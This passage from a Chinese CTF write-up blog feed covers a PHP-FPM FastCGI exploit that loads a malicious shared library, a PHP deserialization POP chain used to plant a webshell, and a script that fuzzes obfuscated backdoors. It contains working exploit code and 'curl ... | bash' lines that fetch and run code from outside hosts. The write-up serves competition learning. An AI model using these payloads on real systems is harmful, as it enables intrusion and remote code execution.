class="line">%01%01%F8%F1%00%08%00%00%00%01%00%00%00%00%00%00%01%04%F8%F1%01%DC%00%00%0E%02CONTENT_LENGTH19%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%17PHP_ADMIN_VALUEextension%20%3D%20/tmp/sky.so%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%F8%F1%00%00%00%00%01%05%F8%F1%00%13%00%00%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%01%05%F8%F1%00%00%00%00</span><br></pre></td></tr></table></figure></p><p>但在使用之前，我们需要首先在/tmp目录下上传一个恶意so文件，我们利用如下github项目进行构造：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"curl xxxx | bash"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC sky.c -o sky</span><br><span class="line">gcc --share sky -o sky.so</span><br></pre></td></tr></table></figure></p><p>接着将sky.so进行上传<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$upload = <span class="string">'/tmp/sky.so'</span>;</span><br><span class="line"><span class="keyword">echo</span> copy(<span class="string">"http://vps_ip/sky.so"</span>, $upload);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-02-15-14-44.png" alt=""><br>最后我们整合上述exp，给出完整Payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fp = stream_socket_client(&quot;/var/run/php/U_wi11_nev3r_kn0w.sock&quot;, $errno, $errstr,30);$out = urldecode(&quot;%01%01%1C%AE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%1C%AE%01%DC%00%00%0E%02CONTENT_LENGTH51%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%17PHP_ADMIN_VALUEextension%20%3D%20/tmp/sky.so%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%1C%AE%00%00%00%00%01%05%1C%AE%003%00%00%3C%3Fphp%20hello_world%28%27curl%20106.14.114.127%20%7C%20bash%27%29%3B%20%3F%3E%01%05%1C%AE%00%00%00%00&quot;);stream_socket_sendto($fp,$out);while (!feof($fp)) &#123;echo htmlspecialchars(fgets($fp, 10)); &#125;fclose($fp);//&apos;</span><br></pre></td></tr></table></figure></p><p>即可getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼 https://www.4hou.com/web/18955.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;鸽了好久的Blog，因为自己事务缠身，一直没时间写一下最近比赛的题解，趁近日有空，来填坑~&lt;br&gt;第一次参加0ctf新星赛就拿了冠军，还是非
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 强网杯online Web Writeup</title>
    <link href="http://skysec.top/2019/05/25/2019-%E5%BC%BA%E7%BD%91%E6%9D%AFonline-Web-Writeup/"/>
    <id>http://skysec.top/2019/05/25/2019-强网杯online-Web-Writeup/</id>
    <published>2019-05-25T07:00:37.000Z</published>
    <updated>2019-05-27T23:56:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>登入题目，首先纵览题目功能，发现有注册和登录：<br><img src="/images/2019-05-25-15-05-13.png" alt=""><br>随便注册登入后，来到文件上传页面：<br><img src="/images/2019-05-25-15-06-24.png" alt=""><br>经探测，发现可以上传png图片,同时上传目录可直接访问：<br><img src="/images/2019-05-25-15-06-50.png" alt=""><br>同时发现cookie有序列化内容：<br><img src="/images/2019-05-25-15-07-23.png" alt=""><br>解码后得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:23;s:8:&quot;username&quot;;s:13:&quot;fuck@fuck.com&quot;;s:5:&quot;email&quot;;s:13:&quot;fuck@fuck.com&quot;;s:8:&quot;password&quot;;s:32:&quot;abf753db781ecf27d7b5c9073880ec86&quot;;s:3:&quot;img&quot;;N;&#125;</span><br></pre></td></tr></table></figure></p><p>上传png后，序列化变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:23;s:8:&quot;username&quot;;s:13:&quot;fuck@fuck.com&quot;;s:5:&quot;email&quot;;s:13:&quot;fuck@fuck.com&quot;;s:8:&quot;password&quot;;s:32:&quot;abf753db781ecf27d7b5c9073880ec86&quot;;s:3:&quot;img&quot;;s:79:&quot;../upload/9862a5f0c459c3f78ba4bab12279ea3d/fb5c81ed3a220004b71069645f112867.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>尝试直接改序列化进行目录穿越<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:23;s:8:&quot;username&quot;;s:13:&quot;fuck@fuck.com&quot;;s:5:&quot;email&quot;;s:13:&quot;fuck@fuck.com&quot;;s:8:&quot;password&quot;;s:32:&quot;abf753db781ecf27d7b5c9073880ec86&quot;;s:3:&quot;img&quot;;s:28:&quot;../../../../../../etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>页面直接跳转至登录页面，猜测不能直接修改序列化内容。<br>根据以往经验，有序列化一般都有源码泄露，否则序列化很难恶意构造，于是探测目录，得到文件泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.66.242:32147/www.tar.gz</span><br></pre></td></tr></table></figure></p><p>审计网站源码，将目光定位到如下3个文件上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web/controller/Index.php</span><br><span class="line">web/controller/Profile.php</span><br><span class="line">web/controller/Register.php</span><br></pre></td></tr></table></figure></p><p>在<code>web/controller/Profile.php</code>看到关键函数操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp))&#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>其中操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp))&#123;</span><br><span class="line">@copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">@unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br></pre></td></tr></table></figure></p><p>跟进<code>$this-&gt;filename_tmp</code>和<code>$this-&gt;filename</code>,发现没有过滤等限制，唯一阻碍：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但我们可以通过直接GET请求，不进入该if判断。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">        $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>同时该校验也可如法炮制，可直接通过设置类中属性进行bypass，不进入if判断。<br>到此为止可得到类的部分构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> $checker=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span> $filename_tmp=<span class="string">'../public/upload/9862a5f0c459c3f78ba4bab12279ea3d/5d0f060446d095e20383edb9e61bd156.png'</span>;</span><br><span class="line"><span class="keyword">public</span> $filename=<span class="string">'../public/upload/9862a5f0c459c3f78ba4bab12279ea3d/sky.php'</span>;</span><br></pre></td></tr></table></figure></p><p>(注：该处路径是<code>../public/upload/</code>，从代码<code>@chdir(&quot;../public/upload&quot;);</code>可发现，一开始我被坑了= =)<br>当该值进入upload_img函数后，即可利用copy成功复制出php文件。但是新的问题来了，如何通过反序列化直接调用upload_img函数。<br>这里可以看到两个魔法方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们知道当对象调用不可访问属性时，就会自动触发<strong>get魔法方法，而在对象调用不可访问函数时，就会自动触发</strong>call魔法方法。<br>那么寻找触发方式可以发现文件<code>web/controller/Register.php</code>，关键部分如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以看到checker调用了类Index里的方法index()，如果我们此时将checker的<strong>construct覆盖为类Profile，那么势必在调用index()方法时，会触发</strong>call函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而进入该函数后，我们会触发<code>$this-&gt;index</code>,成功尝试调用类Profile中不存在的对象，于是可触发__get魔法方法，从而变成<code>return $this-&gt;except[&#39;index&#39;];</code>，那么我们只要在构造序列化时，将except赋值为数组，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br></pre></td></tr></table></figure></p><p>即可在类Register进行__destruct()时，成功触发upload_img函数，进行文件复制和改名。<br>综合上述pop链，我们可以构造如下exp:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp=<span class="string">"../public/upload/9862a5f0c459c3f78ba4bab12279ea3d/5d0f060446d095e20383edb9e61bd156.png"</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"../public/upload/9862a5f0c459c3f78ba4bab12279ea3d/sky.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Register();</span><br><span class="line">$a-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$a-&gt;checker-&gt;checker = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// echo serialize($a);</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br></pre></td></tr></table></figure></p><p>成功改名后可直接getshell，进行命令执行：<br><img src="/images/2019-05-25-15-30-55.png" alt=""><br>进行getflag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://49.4.66.242:32147/upload/9862a5f0c459c3f78ba4bab12279ea3d/sky.php?sky=system(%27ls%27);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-25-15-33-35.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://49.4.66.242:32147/upload/9862a5f0c459c3f78ba4bab12279ea3d/sky.php?sky=system(%27ls%20/%27);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-25-15-33-58.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://49.4.66.242:32147/upload/9862a5f0c459c3f78ba4bab12279ea3d/sky.php?sky=system(%27cat%20/flag%27);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-25-15-34-24.png" alt=""></p><h2 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h2><p><img src="/images/2019-05-25-15-34-55.png" alt=""><br>题目直接提供了源码下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.48.182:31784/www.tar.gz</span><br></pre></td></tr></table></figure></p><p>下载后发现是3000多个混淆过的shell，其中包括多种障眼法：<br><img src="/images/2019-05-25-15-35-59.png" alt=""><br><img src="/images/706CA7490B0918EB26FE6AD941437F24.jpg" alt=""><br>例如看起来可进行RCE的参数，实际上被置空，或者有根本不可能进入的if判断。这让我们寻找可用的后门非常困难。<br>此时有两种想法，一种为动态调试，另一种为fuzz。考虑到便捷性，我使用了后者，思路如下:<br>匹配出所有$_GET或者$_POST参数，然后统一赋值为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;sky cool&apos;;</span><br></pre></td></tr></table></figure></p><p>如果回显中包含sky cool，那么证明该文件为可用shell，于是撰写如下脚本：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">"http://localhost:8888/src/"</span></span><br><span class="line">base_dir = <span class="string">"/Desktop/site/src/"</span></span><br><span class="line">file_list = [<span class="string">'zzt4yxY_RMa.php'</span>,........ <span class="string">'m_tgKOIy5uj.php'</span>, <span class="string">'aEFo52YSPrp.php'</span>, <span class="string">'Hk3aCSWcQZK.php'</span>, <span class="string">'RXoiLRYSOKE.php'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extracts</span><span class="params">(f)</span>:</span></span><br><span class="line">    gets = []</span><br><span class="line">    <span class="keyword">with</span> open(base_dir + f, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        lines = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> lines]</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> line.find(<span class="string">"$_GET['"</span>) &gt; <span class="number">0</span>:</span><br><span class="line">                start_pos = line.find(<span class="string">"$_GET['"</span>) + len(<span class="string">"$_GET['"</span>)</span><br><span class="line">                end_pos = line.find(<span class="string">"'"</span>, start_pos)                </span><br><span class="line">                gets.append(line[start_pos:end_pos])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> gets</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(start,end)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(start,end):</span><br><span class="line">filename = file_list[i]</span><br><span class="line">gets = extracts(filename)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"try: %s"</span>%filename </span><br><span class="line"><span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">now_url = <span class="string">"%s%s?%s=%s"</span>%(base_url,filename,get,<span class="string">'echo "sky cool";'</span>)</span><br><span class="line">r = requests.get(now_url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'sky cool'</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">print</span> now_url</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"%s~%s not found!"</span>%(start,end)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pool = Pool(processes=<span class="number">15</span>)    <span class="comment"># set the processes max number 3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(file_list),len(file_list)/<span class="number">15</span>):</span><br><span class="line">        pool.apply_async(exp,(i,i+len(file_list)/<span class="number">15</span>,))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p>运行后找到文件：<br><img src="/images/2019-05-25-16-38-26.png" alt=""><br>进行getflag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://117.78.48.182:31784/xk0SzyKwfzw.php?Efa5BVG=ls%20/</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-25-15-58-01.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://117.78.48.182:31784/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-25-15-57-50.png" alt=""></p><h2 id="babywebbb"><a href="#babywebbb" class="headerlink" title="babywebbb"></a>babywebbb</h2><p>直接访问题目：<br><img src="/images/2019-05-26-16-19-37.png" alt=""><br>得到信息，发现有证书信任问题。尝试进行信息搜集，找到ip对应的域名：<br><img src="/images/2019-05-26-16-21-57.png" alt=""><br>发现可疑子域名，进行/etc/hosts绑定：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49.4.71.212 qqwwwwbbbbb.52dandan.xyz</span><br></pre></td></tr></table></figure></p><p>访问页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 